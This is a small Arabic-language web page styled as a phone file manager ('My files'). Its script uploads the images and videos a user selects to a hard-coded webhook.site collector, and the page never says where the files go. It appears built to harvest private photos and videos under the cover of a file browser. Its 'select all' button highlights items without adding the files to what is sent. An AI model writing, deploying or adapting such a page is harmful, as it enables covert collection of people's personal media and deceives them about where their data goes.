<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>ملفاتي</title>
  <style>
    body {
      margin: 0;
      padding: 15px;
      background: #111;
      color: #fff;
      font-family: Arial, sans-serif;
    }
    button {
      padding: 12px 25px;
      font-size: 1.2rem;
      margin: 10px;
      border: none;
      border-radius: 8px;
    }
    #list {
      list-style: none;
      padding: 0;
    }
    li {
      padding: 12px;
      background: #222;
      margin: 6px 0;
      border-radius: 6px;
      display: flex;
      align-items: center;
    }
    .selected {
      background: #004d00;
    }
  </style>
</head>
<body>

  <h2>ملفات الهاتف</h2>
  <button onclick="openFiles()">فتح الملفات</button>
  <button onclick="selectAll()">تحديد الكل</button>
  <button onclick="sendSelected()">إرسال المحدد</button>

  <ul id="list"></ul>

<script>
const WEBHOOK_URL = "https://63cf68fa-614f-459e-827a-4235bbee5ed3.webhook.site";
let selectedFiles = [];

function openFiles() {
  const input = document.createElement('input');
  input.type = 'file';
  input.multiple = true;
  input.accept = "image/*,video/*";

  input.onchange = function(e) {
    const list = document.getElementById('list');
    list.innerHTML = '';
    selectedFiles = [];

    Array.from(e.target.files).forEach(file => {
      const li = document.createElement('li');
      li.textContent = file.name + " (" + (file.size / (1024*1024)).toFixed(2) + " MB)";
      
      li.onclick = () => {
        li.classList.toggle('selected');
        if (li.classList.contains('selected')) {
          selectedFiles.push(file);
        } else {
          selectedFiles = selectedFiles.filter(f => f !== file);
        }
      };
      
      list.appendChild(li);
    });
  };

  input.click();
}

function selectAll() {
  document.querySelectorAll('li').forEach(li => {
    li.classList.add('selected');
  });
  alert('تم تحديد كل الملفات');
}

function sendSelected() {
  if (selectedFiles.length === 0) {
    alert('لم تقم بتحديد أي ملف');
    return;
  }

  alert(`جاري إرسال ${selectedFiles.length} ملف ...`);

  selectedFiles.forEach((file, i) => {
    const fd = new FormData();
    fd.append('file', file);
    fd.append('filename', file.name);
    
    fetch(WEBHOOK_URL, { method: 'POST', body: fd });
  });

  alert('تم الإرسال بنجاح!');
}
</script>

</body>
</html>
